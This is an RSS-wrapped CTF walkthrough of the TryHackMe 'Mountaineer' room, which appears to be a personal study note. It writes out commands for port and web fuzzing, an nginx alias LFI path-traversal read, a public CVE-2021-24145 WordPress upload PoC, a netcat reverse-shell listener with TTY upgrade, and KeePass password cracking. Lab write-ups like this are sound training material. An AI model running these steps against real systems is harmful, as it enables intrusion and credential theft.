<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Mountaineer]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>lib/media/favicon.png</url><title>Mountaineer</title><link></link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Mon, 11 Nov 2024 02:53:49 GMT</lastBuildDate><atom:link href="lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Mon, 11 Nov 2024 02:53:48 GMT</pubDate><ttl>60</ttl><dc:creator></dc:creator><item><title><![CDATA[Mountaineer]]></title><description><![CDATA[ 
 <br><br>by <a data-tooltip-position="top" aria-label="https://tryhackme.com/r/p/nirza" rel="noopener nofollow" class="external-link" href="https://tryhackme.com/r/p/nirza" target="_blank">nirza</a> and <a data-tooltip-position="top" aria-label="https://tryhackme.com/r/p/tryhackme" rel="noopener nofollow" class="external-link" href="https://tryhackme.com/r/p/tryhackme" target="_blank">tryhackme</a><br><img alt="Pasted image 20241110105204.png" src="pasted-image-20241110105204.png"><br>Will you find the flags between all these mountains?<br>Room link: <a rel="noopener nofollow" class="external-link" href="https://tryhackme.com/r/room/mountaineerlinux" target="_blank">https://tryhackme.com/r/room/mountaineerlinux</a><br><br>Find the local.txt and root.txt flags!<br>P.S: We have to climb and put the flags in place, so it might take ~ 5 minutes for the machine to load up.<br>Note: For free users using the AttackBox, it is recommended to use your own VM.<br>
<br>IP Address: 10.10.215.192
<br><br>First of all, let's perform a nmap scan<br>sudo nmap -vv -T5 -p- 10.10.215.192
<br><img alt="Pasted image 20241110110138.png" src="pasted-image-20241110110138.png"><br>Here we discover the following ports to be open:<br>
<br>Port 22

<br>Requires us a Username and Password


<br>Port 80

<br>Web Server


<br>Let's now edit the /etc/hosts file to add the IP Address of the target system to get a domain address to browse.<br>sudo nano /etc/hosts
<br>and add the following:<br>10.10.215.192 mountaineer.thm
<br><img alt="Pasted image 20241110105819.png" src="pasted-image-20241110105819.png"><br>Now, when we brows the web browser, we see the default page of nginx.<br><img alt="Pasted image 20241110110018.png" src="pasted-image-20241110110018.png"><br>Now, since there is no other pages to look for, let's fuzz for some subdomains, folders or files from the server.<br><br>Let's first fuzz for some Files against the web server to see if we get any useful files in them.<br>ffuf -w ~/Pranava__Rao/Tools/Fuzzing\ List/SecLists/Discovery/Web-Content/raft-medium-files.txt:FUZZ -u http://mountaineer.thm/FUZZ
<br>Here, we don't see any useful files being shown to us.<br><img alt="Pasted image 20241110110447.png" src="pasted-image-20241110110447.png"><br><br>Now, since there is no files present, let's look for some folders:<br>ffuf -w ~/Pranava__Rao/Tools/Fuzzing\ List/SecLists/Discovery/Web-Content/raft-medium-directories.txt:FUZZ -u http://mountaineer.thm/FUZZ
<br>We can now see from the result that we have got the wordpress folder.<br><img alt="Pasted image 20241110110727.png" src="pasted-image-20241110110727.png"><br><br>So, now, let's browse wordpress folder (<a rel="noopener nofollow" class="external-link" href="http://mountaineer.thm/wordpress/" target="_blank">http://mountaineer.thm/wordpress/</a>).<br><img alt="Pasted image 20241110110836.png" src="pasted-image-20241110110836.png"><br>Here, there is not a much of lead to go anywhere from this page, other than to be able to see the posts and pages of the users.<br>We can try to find for some vulnerabilities of the wordpress site using the api from the wpscan.<br>wpscan --url http://mountaineer.thm/wordpress/ --api-token &lt;Get your own from their site&gt;
<br>You can register an account in <a data-tooltip-position="top" aria-label="https://wpscan.com/" rel="noopener nofollow" class="external-link" href="https://wpscan.com/" target="_blank">WPScan</a> and for free users, you will get a 25 scan per day.<br><img alt="Pasted image 20241110121724.png" src="pasted-image-20241110121724.png"><br>And we see a very interesting and favorable vulnerability of RCE from the scan result.<br><img alt="Pasted image 20241110121850.png" src="pasted-image-20241110121850.png"><br><br><br>When looking through the HackTricks article on <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx" target="_blank">Nginx</a>, one of the things that stands out is Alias LFI Misconfiguration. Using an LFI, we could possibly obtain sensitive files from the server.<br><img alt="Pasted image 20241110113102.png" src="pasted-image-20241110113102.png"><br>We can test this vulnerability by trying to download the /etc/passwd file from the target system using curl<br><img alt="Pasted image 20241110113219.png" src="pasted-image-20241110113219.png"><br>After looking around, and trying to find some good paths to get further information, we got the nginx's configuration file of the sites from /etc/nginx/sites-available/default<br>curl http://mountaineer.thm/wordpress/images../etc/nginx/sites-available/default
<br><img alt="Pasted image 20241110114147.png" src="pasted-image-20241110114147.png"><br><br>So, now, let's modify the /etc/hosts file again to add the new domain into the file address.<br><img alt="Pasted image 20241110114344.png" src="pasted-image-20241110114344.png"><br>Now, let's brows to the address http://adminroundcubemail.mountaineer.thm<br><img alt="Pasted image 20241110114447.png" src="pasted-image-20241110114447.png"><br>Here we see a login page for a mail account (guessing it from the URL, but yeah, it is one, lol). We now have a choice of logging into a user's mail account if we are able to guess their password right.<br>First let's us get the list of users present in the wordpress, we can do that by using the tool wpscan which is going to be scanning for the users in wordpress site using the API Token.<br>wpscan --url http://mountaineer.thm/wordpress/ --api-token &lt;Get your own from their site&gt; --enumerate u
<br>You can register an account in <a data-tooltip-position="top" aria-label="https://wpscan.com/" rel="noopener nofollow" class="external-link" href="https://wpscan.com/" target="_blank">WPScan</a> and for free users, you will get a 25 scan per day.<br><img alt="Pasted image 20241110115831.png" src="pasted-image-20241110115831.png"><br>Which are:<br>ChoOyu
Everest
MontBlanc
admin
k2
everest
montblanc
chooyu
<br>After a bit of analyzing, we see that user k2 has no much of an activity in the server, which makes us more interested in that user. hence let's try to login as the user k2 into the mail application.<br>After a bit of trying and figuring out, we found that the password of the user was the username itself.<br><img alt="Pasted image 20241110120612.png" src="pasted-image-20241110120612.png"><br>And Here we the mail access to the k2 user.<br><img alt="Pasted image 20241110120651.png" src="pasted-image-20241110120651.png"><br>Now!! The next thing we do is to trigger a password reset request on wp-login.<br><img alt="Pasted image 20241110122132.png" src="pasted-image-20241110122132.png"><br>And we get a mail from Wordpress for the password reset.<br><img alt="Pasted image 20241110122347.png" src="pasted-image-20241110122347.png"><br>Click on the link and it will redirect you to a page with a password generated to us. Just copy the password as we need it for logging in.<br><img alt="Pasted image 20241110122306.png" src="pasted-image-20241110122306.png"><br>Here using the password, login to the user.<br><img alt="Pasted image 20241110122555.png" src="pasted-image-20241110122555.png"><br>Now, that we have the username and the Password of one of the admins of the site, let's run a poc tool from GitHub from <a data-tooltip-position="top" aria-label="https://github.com/dnr6419/CVE-2021-24145/tree/main" rel="noopener nofollow" class="external-link" href="https://github.com/dnr6419/CVE-2021-24145/tree/main" target="_blank">dnr6419</a>.<br>Clone the repository:<br>git clone https://github.com/dnr6419/CVE-2021-24145.git
<br><img alt="Pasted image 20241110124402.png" src="pasted-image-20241110124402.png"><br>Now, let's runt he tool <br>python3 poc.py -T mountaineer.thm -P 80 -U /wordpress/ -u k2 -p "pY)B3*F)9hDrZd&amp;QJqaO9OBZ"
<br><img alt="Pasted image 20241110125339.png" src="pasted-image-20241110125339.png"><br>and now, when we brows to the shell.php page (<a rel="noopener nofollow" class="external-link" href="http://mountaineer.thm/wordpress//wp-content/uploads/shell.php" target="_blank">http://mountaineer.thm/wordpress//wp-content/uploads/shell.php</a>) we can see a p0wnyshell, let's upgrade that shell into a bash shell in our terminal<br><br>Using the shell code from <a data-tooltip-position="top" aria-label="https://www.revshells.com/" rel="noopener nofollow" class="external-link" href="https://www.revshells.com/" target="_blank">Revshells</a> using BusyBox<br><img alt="Pasted image 20241110130017.png" src="pasted-image-20241110130017.png"><br>First, let us set up a listener.<br>nc -lvnp 4445
<br><img alt="Pasted image 20241110130157.png" src="pasted-image-20241110130157.png"><br>And now run the command:<br><img alt="Pasted image 20241110130227.png" src="pasted-image-20241110130227.png"><br>We see that we have got a reverse shell access into our machine.<br>That is still not useful, that is why, you can make it better by using the Ctrl + Z command<br>First, type in the following command:<br>python3 -c 'import pty; pty.spawn("/bin/bash")'
<br>Spawning /bin/bash using <a data-tooltip-position="top" aria-label="https://docs.python.org/3/library/pty.html" rel="noopener nofollow" class="external-link" href="https://docs.python.org/3/library/pty.html" target="_blank">Python’s PTY module</a>, and connect the controlling shell with its standard I/O.<br>Then, once you get a shell, press Ctrl + Z which will background the shell, then update the local terminal line settings with stty and bring the remote shell back.<br>stty raw -echo &amp;&amp; fg
<br><img alt="Pasted image 20241110130538.png" src="pasted-image-20241110130538.png"><br>Now, when we go the /home/k2 folder, we don't see any flag.txt or local.txt, but we see a folder called mail which is of the user k2. So, let's switch to the user k2 using the same password that we used for the mail login.<br>su k2
<br><img alt="Pasted image 20241110131518.png" src="pasted-image-20241110131518.png"><br>Now, in the mail folder, we see a file called Sent which has the following content.<br><img alt="Pasted image 20241110141756.png" src="pasted-image-20241110141756.png"><br>now, we see a new user lhotse present in the system to which k2 user has a bit of access to.<br><img alt="Pasted image 20241110142048.png" src="pasted-image-20241110142048.png"><br><br>Since the KeePass file has a reasonable size, we use base64 to make this content 'copyable'.<br><img alt="Pasted image 20241110143001.png" src="pasted-image-20241110143001.png"><br>Now, using the Base64 and CyberChef, let's decode the file and save in our downloads folder.<br><img alt="Pasted image 20241110143158.png" src="pasted-image-20241110143158.png"><br>If the files was correctly downloaded, you will see the file format to be right.<br><img alt="Pasted image 20241110143309.png" src="pasted-image-20241110143309.png"><br><br>Now, let's use a tool called cupp which will generate some Passwords using the profile's details (Learn about the Tool from <a data-tooltip-position="top" aria-label="https://github.com/Mebus/cupp" rel="noopener nofollow" class="external-link" href="https://github.com/Mebus/cupp" target="_blank">Here</a>) <br>cupp -i
<br><img alt="Pasted image 20241110144004.png" src="pasted-image-20241110144004.png"><br><img alt="Pasted image 20241110144023.png" src="pasted-image-20241110144023.png"><br><br>We can now transform the KeePass file to a hash file using keepass2john.<br>keepass2john download.kdbx &gt; download.kdbx.hash
<br><img alt="Pasted image 20241110144258.png" src="pasted-image-20241110144258.png"><br>Now, let's run John The ripper to crack our password using the list that we generated.<br>john --wordlist=mount.txt download.kdbx.hash
<br><img alt="Pasted image 20241110144413.png" src="pasted-image-20241110144413.png"><br>Here we get the master password of the file Lhotse56185<br>Using the mater password, use can open the file using keepass2 tool and find entries for mblanc and kangchenjunga.<br><img alt="Pasted image 20241110150204.png" src="pasted-image-20241110150204.png"><br>Using the credentials of kangchenjunga user to switch ourself into using the su command.<br><img alt="Pasted image 20241110150441.png" src="pasted-image-20241110150441.png"><br>In the home directory of the user, we find the first flag.<br><img alt="Pasted image 20241110150811.png" src="pasted-image-20241110150811.png"><br>Furthermore, we see that the .bash_history file has the root user's password in it!!!!.<br><img alt="Pasted image 20241110151004.png" src="pasted-image-20241110151004.png"><br>Now, it is a cake walk... just change the user and then you go!!!<br><img alt="Pasted image 20241110151212.png" src="pasted-image-20241110151212.png">]]></description><link>mountaineer.html</link><guid isPermaLink="false">Mountaineer.md</guid><pubDate>Sun, 10 Nov 2024 09:42:13 GMT</pubDate><enclosure url="pasted-image-20241110105204.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;pasted-image-20241110105204.png&quot;&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>